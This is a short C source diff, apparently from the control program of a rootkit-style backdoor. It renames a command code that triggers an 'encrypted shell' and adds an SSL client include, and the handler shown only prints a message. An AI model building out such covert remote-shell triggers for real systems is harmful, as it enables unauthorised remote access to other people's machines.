@@ -19,6 +19,7 @@
 #include "include/utils/strings/regex.h"
 #include "include/utils/structures/fdlist.h"
 #include "include/modules/module_manager.h"
+#include "include/utils/network/ssl_client.h"
 
 #define ABORT_IF_ERR(err, msg)\
 	if(err<0){\
@@ -107,7 +108,7 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 	}else if(e->event_type == COMMAND){
 		printf("%s COMMAND  pid:%d code:%i\n", ts, e->pid, e->code);
 		switch(e->code){
-			case CC_PROT_K3_ENCRYPTED_SHELL_TRIGGER_V1:
+			case CC_PROT_COMMAND_ENCRYPTED_SHELL:
 				printf("Starting encrypted connection\n");
 				
             	break;
